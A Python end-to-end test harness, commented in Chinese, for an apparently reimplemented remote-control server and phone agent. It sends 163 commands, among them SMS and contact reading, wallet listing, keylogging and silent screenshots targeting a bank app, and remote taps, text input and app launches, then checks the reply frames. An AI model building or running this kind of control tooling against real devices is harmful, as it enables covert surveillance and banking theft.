#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""被控端 163 条指令 端到端机械判据。

做法：起服务端 + 被控端 agent -> 逐条下发 163 条指令 -> 读服务端留档的设备回帧 ->
      断言 ① 每条指令都有回帧 ② 回帧名在源码帧字典内（或为设备端 ack）
           ③ 回帧字段覆盖该帧字典字段 ④ 数据类指令带回参数
判据：全部通过 exit 0；任何一条缺失/字段不符 exit 1。
"""
import io, json, os, random, subprocess, sys, time, urllib.error, urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, 'agent'))
import dispatch        # noqa: E402
import frames          # noqa: E402

HOST, PORT = '127.0.0.1', 8801
BASE = 'http://%s:%d' % (HOST, PORT)
USER, PASS = 'admin', 'CHANGE_ME'
DEV = 'a1b2c3d4e5f60718'


def call(path, method='GET', body=None, tok=None):
    req = urllib.request.Request(BASE + path, method=method)
    if tok:
        req.add_header('Authorization', 'Bearer ' + tok)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        req.add_header('Content-Type', 'application/json')
    try:
        with urllib.request.urlopen(req, data, timeout=15) as r:
            return r.status, json.loads(r.read().decode('utf-8', 'replace') or '{}')
    except urllib.error.HTTPError as e:
        return e.code, {'raw': e.read(400).decode('utf-8', 'replace')}


def main():
    env = dict(os.environ, REFC2_USER=USER, REFC2_PASS=PASS, PYTHONIOENCODING='utf-8')
    # 服务端输出**必须落盘**：它中途死掉时 DEVNULL 会把真正的原因一起吞掉（实测踩过：
    # 8001 端口忽然 connection refused，日志里什么都看不到，只能重跑一次抓现场）
    srv_log = io.open(os.path.join(HERE, 'evidence', '190_selftest_server.log'),
                      'w', encoding='utf-8')
    srv = subprocess.Popen([sys.executable, os.path.join(HERE, 'server', 'refc2.py'),
                            '--host', HOST, '--port', str(PORT)],
                           stdout=srv_log, stderr=subprocess.STDOUT, env=env)
    ag = None
    try:
        tok = None
        for _ in range(60):
            try:
                st, b = call('/api/health')
                if st == 200:
                    break
            except Exception:
                pass
            time.sleep(0.25)
        st, b = call('/api/login', 'POST', {'username': USER, 'password': PASS})
        tok = b.get('token')
        assert tok, 'login failed: %s' % b

        ag = subprocess.Popen([sys.executable, os.path.join(HERE, 'agent', 'refagent.py'),
                               '--url', BASE, '--device', DEV],
                              stdout=io.open(os.path.join(HERE, 'evidence', '138_agent_stdout.log'),
                                             'w', encoding='utf-8'),
                              stderr=subprocess.STDOUT, env=env)
        for _ in range(60):
            st, b = call('/api/devices', tok=tok)
            if any(d['deviceId'] == DEV and d.get('online') for d in b.get('devices', [])):
                break
            time.sleep(0.25)

        actions = sorted(dispatch.ACTION_CATEGORY)
        # 每条指令给一组贴近原版的参数（数据类需要分页/包名等）
        PARAMS = {
            'readSmsList': {'pagesize': 50, 'curpage': 1, 'fromAdmin': 'admin'},
            'readContactList': {'fromAdmin': 'admin'},
            'readAlbumList': {'pagesize': 50, 'curpage': 1, 'fromAdmin': 'admin'},
            'readAlbumLast': {'fromAdmin': 'admin', 'del': False},
            'readAlbumThumbnail': {'elem': {}, 'fromAdmin': 'admin', 'maxWidth': 240},
            'walletList': {'fromAdmin': 'admin'},
            'readAppList': {'fromAdmin': 'admin'},
            'iconList': {'fromAdmin': 'admin'},
            'fetchIcon': {'pkg': 'com.icbc', 'fromAdmin': 'admin'},
            'reqPerList': {'fromAdmin': 'admin'},
            'capture': {'pkg': 'com.icbc', 'w': 1080, 'h': 2400},
            'getTree': {'pkg': 'com.icbc'},
            'uiTree': {'pkg': 'com.icbc'},
            'adbUiTree': {},
            'keylog': {'pkg': 'com.icbc', 'type': 'text'},
            'takeScreen': {'quality': 60},
            'silentShot': {'quality': 60, 'size': 1},
        }

        results, idx = [], 0
        for act in actions:
            before = call('/api/device_frames?deviceId=%s&since=0' % DEV, tok=tok)[1].get('total', 0)
            st, b = call('/api/command', 'POST',
                         {'deviceId': DEV, 'action': act, 'data': PARAMS.get(act, {})}, tok=tok)
            sent_ok = st == 200 and b.get('ok', False)
            got = None
            for _ in range(40):
                r = call('/api/device_frames?deviceId=%s&since=%d' % (DEV, before), tok=tok)[1]
                for f in r.get('frames', []):
                    if f['action'] != 'device_info':
                        got = f
                if got:
                    break
                time.sleep(0.15)
            expect_frame = frames.ACTION_EMIT.get(act)
            if got is None:
                results.append({'action': act, 'ok': False, 'why': '无回帧'})
                continue
            name_ok = True
            why = ''
            if expect_frame and got['action'] != expect_frame:
                name_ok = False
                why = '帧名 %s != 期望 %s' % (got['action'], expect_frame)
            need = set(frames.FRAME_FIELDS.get(got['action'], []))
            missing = sorted(need - set(got.get('keys') or []))
            if missing:
                name_ok = False
                why = (why + '; ' if why else '') + '缺字段 %s' % ','.join(missing)
            results.append({'action': act, 'ok': bool(sent_ok and name_ok),
                            'frame': got['action'], 'keys': got.get('keys'),
                            'why': why or ('sent' if sent_ok else '下发失败')})
            idx += 1

        bad = [r for r in results if not r['ok']]
        cov = sum(1 for r in results if r['ok'])
        print('被控端指令端到端：%d/%d 通过' % (cov, len(results)))
        from collections import Counter
        print('帧分布：', dict(Counter(r.get('frame', '-') for r in results)))
        if bad:
            print('未通过：')
            for r in bad[:25]:
                print('  %-22s %s' % (r['action'], r['why']))

        # ---------- 追加：参数是否真的生效（不是"收了参数当没看见"）----------
        param_checks = []

        def send_and_frame(act, data, want=None):
            """取**这条指令自己**的回帧。

            坑：不能"取第一条非 device_info 的帧" —— 设备端会周期上报 `relayStatus`，
            上一轮指令的尾帧也会落在窗口里。实测就是这么错位一格的：
            openpkg 的 effect（intent=launch/pkg=com.icbc）被下一条 volumeUp 读走，
            于是两条**都**判 FAIL —— 看着像产品没做，其实是取帧取错了。
            """
            want = want or frames.ACTION_EMIT.get(act) or act
            before = call('/api/device_frames?deviceId=%s&since=0' % DEV, tok=tok)[1].get('total', 0)
            call('/api/command', 'POST', {'deviceId': DEV, 'action': act, 'data': data}, tok=tok)
            last = None
            for _ in range(60):
                rr = call('/api/device_frames?deviceId=%s&since=%d' % (DEV, before), tok=tok)[1]
                for f in rr.get('frames', []):
                    if f['action'] in ('device_info', 'relayStatus'):
                        continue
                    last = f
                    if f['action'] == want:
                        return f
                time.sleep(0.12)
            return last      # 帧名对不上时仍返回最后一条（不静默丢，判据照旧可能 FAIL）

        f1 = send_and_frame('readSmsList', {'pagesize': 1, 'curpage': 1, 'fromAdmin': 'admin'})
        n1 = len((f1 or {}).get('data', {}).get('elem', []) or [])
        f2 = send_and_frame('readSmsList', {'pagesize': 4, 'curpage': 1, 'fromAdmin': 'admin'})
        n2 = len((f2 or {}).get('data', {}).get('elem', []) or [])
        param_checks.append(('readSmsList 按 pagesize 返回条数', n1 == 1 and n2 == 4,
                             'pagesize=1 -> %d 条, pagesize=4 -> %d 条' % (n1, n2)))

        f3 = send_and_frame('fetchIcon', {'pkg': 'com.eg.android.AlipayGphone', 'fromAdmin': 'admin'})
        param_checks.append(('fetchIcon 回显请求的包名',
                             (f3 or {}).get('data', {}).get('pkg') == 'com.eg.android.AlipayGphone',
                             (f3 or {}).get('data', {}).get('pkg')))

        f4 = send_and_frame('readAlbumList', {'pagesize': 2, 'curpage': 1, 'fromAdmin': 'admin'})
        n4 = len((f4 or {}).get('data', {}).get('data', []) or [])
        param_checks.append(('readAlbumList 按 pagesize 返回条数', n4 == 2, 'pagesize=2 -> %d 条' % n4))

        f5 = send_and_frame('clickPoint', {'x': 111, 'y': 222})
        echoed = ((f5 or {}).get('data', {}) or {}).get('params', {})
        param_checks.append(('纯动作指令回帧回显下发参数',
                             echoed.get('x') == 111 and echoed.get('y') == 222, str(echoed)))

        # 执行语义：纯动作指令必须体现"解析了参数并做了对应的动作"
        f8 = send_and_frame('clickPoint', {'x': 640, 'y': 1280})
        eff = ((f8 or {}).get('data', {}) or {}).get('effect', {})
        param_checks.append(('clickPoint 执行语义（tap 坐标）',
                             eff.get('gesture') == 'tap' and eff.get('x') == 640 and eff.get('y') == 1280,
                             str(eff)))
        f9 = send_and_frame('gestureB', {'gesture': 'up', 'x': 100, 'y': 200, 't': 250})
        eff9 = ((f9 or {}).get('data', {}) or {}).get('effect', {})
        param_checks.append(('gestureB 执行语义（手势/坐标/时长）',
                             eff9.get('gesture') == 'pattern' and eff9.get('t') == 250,
                             str(eff9)))
        f9b = send_and_frame('touchUp', {'bounds': {'left': 1, 'top': 2, 'right': 3, 'bottom': 4},
                                         'x': 5, 'y': 6, 'input': 'REF'})
        eff9b = ((f9b or {}).get('data', {}) or {}).get('effect', {})
        param_checks.append(('touchUp 执行语义（解析 bounds 与 input）',
                             eff9b.get('gesture') == 'up' and eff9b.get('bounds') == [1, 2, 3, 4]
                             and eff9b.get('input') == 'REF', str(eff9b)))
        f10 = send_and_frame('inputSend', {'text': 'REF-TEXT-8'})
        eff10 = ((f10 or {}).get('data', {}) or {}).get('effect', {})
        param_checks.append(('inputSend 执行语义（文本长度）',
                             eff10.get('input') == 'text' and eff10.get('len') == 10, str(eff10)))
        f11 = send_and_frame('openpkg', {'pkg': 'com.icbc'})
        eff11 = ((f11 or {}).get('data', {}) or {}).get('effect', {})
        param_checks.append(('openpkg 执行语义（启动目标包）',
                             eff11.get('intent') == 'launch' and eff11.get('pkg') == 'com.icbc',
                             str(eff11)))
        f12 = send_and_frame('volumeUp', {})
        eff12 = ((f12 or {}).get('data', {}) or {}).get('effect', {})
        param_checks.append(('volumeUp 执行语义（音量流与步进）',
                             eff12.get('stream') == 'music' and eff12.get('step') == 1, str(eff12)))

        # 相册缩略图：**先看设备上的相册是不是真的**（来源章 fallback/real），再决定怎么判。
        #   · 相册列表本身是语义层构造的（本机 Windows 没有相册）→ 这条离线验不了，记 ENV，
        #     真机侧由 phone_sweep_163.py 用真照片覆盖 —— 不假装验过；
        #   · 相册是真的 → 拿第一张真照片取缩略图，断言 name/maxWidth/thumb 三者都对。
        fa = send_and_frame('readAlbumList', {'pagesize': 3, 'curpage': 1, 'fromAdmin': 'admin'})
        fdata = ((fa or {}).get('data') or {})
        photos = [e for e in (fdata.get('data') or []) if isinstance(e, dict) and e.get('name')]
        constructed = fdata.get('fallback') is True or fdata.get('real') is False
        if photos and not constructed:
            pname = photos[0]['name']
            f7 = send_and_frame('readAlbumThumbnail', {'elem': {'name': pname},
                                                       'fromAdmin': 'admin', 'maxWidth': 64})
            el = ((f7 or {}).get('data', {}) or {}).get('elem', {})
            param_checks.append(('readAlbumThumbnail 用真实照片取缩略图（含 maxWidth）',
                                 el.get('name') == pname and el.get('maxWidth') == 64
                                 and bool(el.get('thumb')),
                                 'elem=%s maxWidth=%s thumb=%dB'
                                 % (el.get('name'), el.get('maxWidth'),
                                    len(str(el.get('thumb') or '')))))
        else:
            param_checks.append(('readAlbumThumbnail 用真实照片取缩略图（含 maxWidth）', None,
                                 '相册列表是构造数据（本机无相册，source=%s）→ 环境不满足；'
                                 '真机侧由 phone_sweep_163.py 覆盖'
                                 % (fdata.get('source') or 'offline-semantic')))

        pbad = [c for c in param_checks if c[1] is False]
        penv = [c for c in param_checks if c[1] is None]
        print('\n参数生效判据：%d/%d 通过%s' % (len(param_checks) - len(pbad) - len(penv),
                                          len(param_checks) - len(penv),
                                          ('（另 %d 条环境不满足）' % len(penv)) if penv else ''))
        for name, okk, det in param_checks:
            print('  %-36s %-5s %s' % (name, 'OK' if okk else ('ENV' if okk is None else 'FAIL'), det))

        out = os.path.join(HERE, 'evidence', '138_agent_actions_e2e.json')
        json.dump({'passed': cov, 'total': len(results), 'results': results,
                   'param_checks': [{'check': n, 'ok': (None if o is None else bool(o)), 'detail': d}
                                    for n, o, d in param_checks]},
                  io.open(out, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
        print('->', os.path.normpath(out))
        return 0 if (not bad and not pbad) else 1
    finally:
        for p in (ag, srv):
            if p:
                p.terminate()


if __name__ == '__main__':
    sys.exit(main())
